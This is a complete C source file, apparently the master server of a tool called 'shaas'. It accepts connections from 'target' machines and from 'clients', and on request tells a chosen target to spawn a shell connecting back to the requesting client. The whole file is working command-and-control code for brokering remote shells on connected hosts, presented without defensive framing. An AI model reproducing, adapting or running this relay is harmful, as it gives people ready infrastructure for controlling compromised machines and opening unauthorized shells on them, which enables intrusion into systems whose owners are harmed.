#define _GNU_SOURCE
#include "include/shaas/config.h"
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <shaas/request.h>
#include <shaas/config.h>

// LOCAL TYPE DEFINITIONS
struct target_data {
  struct sockaddr_in saddr;
  int fd;
  int request_fd;
  struct sockaddr_in request_addr;
  pthread_t thread;
  pthread_cond_t cond;
  pthread_mutex_t mutex;
};
/* ****************************************** */

// PROTOS
static int
wait_and_handle_requests(int target_fd, struct target_data *tgt);
static int
send_close_magic(int target_fd, char *success);
/* ****************************************** */

// GLOBAL VARS
static struct target_data targets_data[MASTER_TARGETS_MAX];
static sigset_t thread_sigmask;
static pthread_t clients_listener_thread;
static int clients_listener_fd;
static int running;
/* ****************************************** */

// SIGNAL HANDLERS
static void sigalrm_handler(int signo) {
  // This is only here to interrupt syscalls
  fprintf(stderr, "[!] (thread %d) Interruption requested\n", gettid());
}

static void
sigterm_handler(int signo) {
  pthread_exit(NULL);
}

static void
sigint_handler(int signo) {
  running = 0;
  putchar('\n'); // Evict ^C
}

/* ****************************************** */

static void*
alarm_thread_routine(void *data) {
  pthread_t thd = (pthread_t)data;
  sleep(CONN_TIMEOUT);
  pthread_kill(thd, SIGALRM);
  return NULL;
}

static pthread_t
start_timeout_alarm(pthread_t thd) {
  pthread_t alarm;
  pthread_create(&alarm, NULL, &alarm_thread_routine, (void*)thd);
  return alarm;
}

static void
stop_timeout_alarm(pthread_t alarm) {
  pthread_kill(alarm, SIGTERM);
}

static int
send_close_magic(int target_fd, char* success) {
  union client_request request;
  memcpy(request.bytes, close_magic, sizeof(close_magic));
  write(target_fd, &request, sizeof(union client_request));
  if (success != NULL)  
    return read(target_fd, success, 1);
  else {
    success = 0;
    return 0;
  }
}

static void*
client_listener_thread_routine(void* data) {
  struct sockaddr_in sock_addr, request_addr;
  struct target_data* td;
  in_addr_t target_addr;
  socklen_t request_addr_len;
  int request_fd, match;
  long rc;
  size_t i;
  pthread_t alarm;

  pthread_sigmask(SIG_BLOCK, &thread_sigmask, NULL);

  rc = clients_listener_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (rc < 0) {
    perror("clients listener socket()");
    goto early_fail;
  }

  rc = 1;
  rc = setsockopt(
    clients_listener_fd,
    SOL_SOCKET,
    SO_REUSEADDR,
    &rc,
    sizeof(int));
  if (rc < 0) {
    perror("clients listener setsockopt()");
    goto closefd_fail;
  }

  sock_addr.sin_family = AF_INET;
  sock_addr.sin_addr.s_addr = INADDR_ANY;
  sock_addr.sin_port = htons(MASTER_REQUEST_PORT);

  rc = bind(clients_listener_fd, (struct sockaddr*)&sock_addr, sizeof(struct sockaddr_in));
  if (rc < 0) {
    perror("clients listener bind()");
    goto closefd_fail;
  }

  rc = listen(clients_listener_fd, MASTER_TARGETS_MAX);
  if (rc < 0) {
    perror("clients listener listen()");
    goto closefd_fail;
  }

  printf(
    "[*] Client listener bound on port %d. Listening for clients...\n",
    MASTER_REQUEST_PORT);

  while (running) {
    request_addr_len = sizeof(struct sockaddr_in);
    rc = request_fd =
        accept(clients_listener_fd, (struct sockaddr*)&request_addr, &request_addr_len);
    if (rc < 0) {
      if (!running)
        break;
      perror("clients listener accept()");
      continue;
    }

    // Let's try and read 4 bytes from request_fd to get the target
    alarm = start_timeout_alarm(clients_listener_thread);
    rc = read(request_fd, &target_addr, sizeof(in_addr_t));
    if (rc < 0) {
      perror("clients listener read()");
      close(request_fd);
      continue;
    }
    stop_timeout_alarm(alarm);

    // Let's search the args array for this address
    match = 0;
    for (i = 0; i < MASTER_TARGETS_MAX; ++i) {
      td = &targets_data[i];
      pthread_mutex_lock(&td->mutex);
      if (td->saddr.sin_addr.s_addr == target_addr) {
        td->request_fd = request_fd;
        td->request_addr = request_addr;
        pthread_mutex_unlock(&td->mutex);
        pthread_cond_signal(&td->cond);
        match = 1;
        break;
      }
      pthread_mutex_unlock(&td->mutex);
    }

    if (!match) {
      fputs("[!] Client asked for an IP I don't have", stderr);
      close(request_fd);
    }
  }

closefd_fail:
  close(clients_listener_fd);
  clients_listener_fd = 0;
early_fail:
  puts("[*] Bye bye from clients listener thread");
  return NULL;
}

static void*
target_listener_thread_routine(void* data) {
  struct sockaddr_in target_addr;
  struct target_data* td;
  int tid, rc, target_fd;
  char success, ip_str[INET_ADDRSTRLEN];

  pthread_sigmask(SIG_BLOCK, &thread_sigmask, NULL);
  tid = gettid();

  // Unpack
  td = (struct target_data*)data;
  pthread_mutex_lock(&td->mutex);
  target_addr = td->saddr;
  target_fd = td->fd;
  pthread_mutex_unlock(&td->mutex);

  // Handle the connection
  inet_ntop(AF_INET, &target_addr.sin_addr, ip_str, sizeof(ip_str));
  printf("[*] (thread %d) Target connected from %s\n", tid, ip_str);

  rc = wait_and_handle_requests(target_fd, td);
  if (rc < 0) {
    fputs("target listener wait_and_handle_requests(): error", stderr);
    // TODO: error handling?
  }

  rc = send_close_magic(target_fd, &success);
  if (rc < 0 || !success)
    fprintf(
      stderr,
      "[!] (thread %d) Target did not respond to close request\n",
      tid);
  close(target_fd);

  printf("[*] Bye bye from thread %d\n", tid);
  return NULL;
}

static int
wait_and_handle_requests(int target_fd, struct target_data *td) {
  char success;
  int rc, request_fd, tid;
  pthread_t thd;
  pthread_t alarm;
  in_port_t request_port;
  struct sockaddr_in request_addr;
  union client_request request;
  char ip_str[INET_ADDRSTRLEN];

  success = 1;
  thd = td->thread;
  tid = gettid();
  while (running) {
    // Wait for listener thread to hand us a client connection
    pthread_mutex_lock(&td->mutex);
    pthread_cond_wait(&td->cond, &td->mutex);
    request_fd = td->request_fd;
    request_addr = td->request_addr;
    td->request_fd = 0;
    memset(&td->request_addr, 0, sizeof(struct sockaddr_in));
    pthread_mutex_unlock(&td->mutex);
    if (!running)
      break;
    
    if (request_fd <= 0) {
      fprintf(stderr, "[!] (thread %d) Received invalid request_fd\n", tid);
      continue;
    }

    inet_ntop(AF_INET, &request_addr.sin_addr, ip_str, sizeof(ip_str));
    printf("[*] (thread %d) Incoming request from %s\n", tid, ip_str);

    alarm = start_timeout_alarm(thd);
    rc = read(request_fd, &request_port, sizeof(in_port_t));
    if (rc < 0) {
      fprintf(stderr, "[!] (thread %d) Read fail!\n", tid);
      perror("target listener read()");
      goto end_connection;
    }
    stop_timeout_alarm(alarm);

    request.client_ip = request_addr.sin_addr.s_addr;
    request.client_port = request_port;

    alarm = start_timeout_alarm(thd);
    write(target_fd, &request, sizeof(union client_request));
    rc = read(target_fd, &success, 1);
    if (rc < 0) {
      fprintf(stderr, "[*] (thread %d) Read fail!\n", tid);
      perror("target listener read()");
      success = 0;
    }
    if (!success) {
      fprintf(
        stderr,
        "[*] (thread %d) Target could not spawn a shell!\n",
        tid);
    }
    write(request_fd, &success, 1);
    stop_timeout_alarm(alarm);

  end_connection:
    close(request_fd);
    td->request_fd = 0;
  }

  return rc;
}

int
main(void) {
  int rc, master_fd, target_fd;
  socklen_t target_addr_len;
  size_t i, tries, pool_index;
  struct target_data* td;
  struct sockaddr_in master_addr, target_addr;
  struct sigaction sigint_action, sigpipe_action;
  struct sigaction sigalrm_action, sigterm_action;
  char ip_str[INET_ADDRSTRLEN];

  memset(targets_data, 0, sizeof(targets_data));
  clients_listener_fd = 0,
  pool_index = 0;

  sigemptyset(&thread_sigmask);
  sigaddset(&thread_sigmask, SIGINT);

  sigpipe_action.sa_flags = 0;
  sigpipe_action.sa_handler = SIG_IGN;
  sigemptyset(&sigpipe_action.sa_mask);
  rc = sigaction(SIGPIPE, &sigpipe_action, NULL);
  if (rc < 0) {
    perror("sigaction(SIGPIPE)");
    goto early_fail;
  }
  
  sigint_action.sa_flags = 0;
  sigint_action.sa_handler = &sigint_handler;
  sigemptyset(&sigint_action.sa_mask);
  rc = sigaction(SIGINT, &sigint_action, NULL);
  if (rc < 0) {
    perror("sigaction(SIGINT)");
    goto early_fail;
  }

  sigalrm_action.sa_flags = 0;
  sigalrm_action.sa_handler = &sigalrm_handler;
  sigemptyset(&sigalrm_action.sa_mask);
  rc = sigaction(SIGALRM, &sigalrm_action, NULL);
  if (rc < 0) {
    perror("sigaction(SIGALRM)");
    goto early_fail;
  }

  sigterm_action.sa_flags = 0;
  sigterm_action.sa_handler = &sigterm_handler;
  sigemptyset(&sigterm_action.sa_mask);
  rc = sigaction(SIGTERM, &sigterm_action, NULL);
  if (rc < 0) {
    perror("sigaction(SIGTERM)");
    goto early_fail;
  }

  rc = master_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (rc < 0) {
    perror("main socket()");
    goto early_fail;
  }

  rc = 1;
  rc = setsockopt(master_fd, SOL_SOCKET, SO_REUSEADDR, &rc, sizeof(int));
  if (rc < 0) {
    perror("main setsockopt()");
    goto close_masterfd;
  }

  master_addr.sin_family = AF_INET;
  master_addr.sin_addr.s_addr = INADDR_ANY;
  master_addr.sin_port = htons(MASTER_TARGET_PORT);

  rc = bind(
      master_fd,
      (struct sockaddr*)&master_addr,
      sizeof(struct sockaddr_in));
  if (rc < 0) {
    perror("bind");
    goto close_masterfd;
  }

  printf("[*] Bound on port %d. Listening for targets\n", MASTER_TARGET_PORT);

  // Initialize locks and conds
  for (i = 0; i < MASTER_TARGETS_MAX; ++i) {
    pthread_mutex_init(&targets_data[i].mutex, NULL);
    pthread_cond_init(&targets_data[i].cond, NULL);
  }

  rc = listen(master_fd, MASTER_TARGETS_MAX);
  if (rc < 0) {
    perror("main listen()");
    goto close_masterfd;
  }
  
  running = 1;

  // We launch the listener thread
  pthread_create(&clients_listener_thread, NULL, &client_listener_thread_routine, NULL);

  // Listen for targets connections until we get SIGINT
  while (running) {
    target_addr_len = sizeof(struct sockaddr_in);
    rc = target_fd =
        accept(master_fd, (struct sockaddr*)&target_addr, &target_addr_len);
    if (rc < 0) {
      if (!running)
        break;
      perror("main accept()");
      continue;
    }

    td = &targets_data[pool_index];

    // We try to acquire the lock for a number of slot, before giving up
    for (tries = 0; tries < MASTER_TARGETS_MAX; ++tries) {
      if (pthread_mutex_trylock(&targets_data[pool_index].mutex) == 0) {
        if (td->fd == 0)
          break;
        pthread_mutex_unlock(&td->mutex);
      }
      pool_index = (pool_index+1) % MASTER_TARGETS_MAX;
    }

    // No slots, discard connection (sorry pal)
    if (tries == MASTER_TARGETS_MAX)
      continue;

    // We have handled sync, now let's launch the thread
    td->fd = target_fd;
    td->saddr = target_addr;
    pthread_create(
      &td->thread,
      NULL,
      &target_listener_thread_routine,
      (void*)td);
    pthread_mutex_unlock(&td->mutex);
    
    // We can no longer use this slot
    pool_index = (pool_index+1) % MASTER_TARGETS_MAX;

    inet_ntop(
      target_addr.sin_family,
      &target_addr.sin_addr,
      ip_str,
      sizeof(ip_str));
    printf("[*] Accepted connection from target with IP %s\n", ip_str);
  }

  if (clients_listener_fd > 0) {
    pthread_kill(clients_listener_thread, SIGALRM);
    pthread_join(clients_listener_thread, NULL);
  }

  for (i = 0; i < MASTER_TARGETS_MAX; ++i) {
    td = &targets_data[i];
    if (td->thread != 0) {
      pthread_cond_signal(&td->cond);
      pthread_join(td->thread, NULL);
    }
  }

  rc = 0;
  puts("[*] Bye bye from targets listener thread!");
close_masterfd:
  close(master_fd);
early_fail:
  return rc;
}
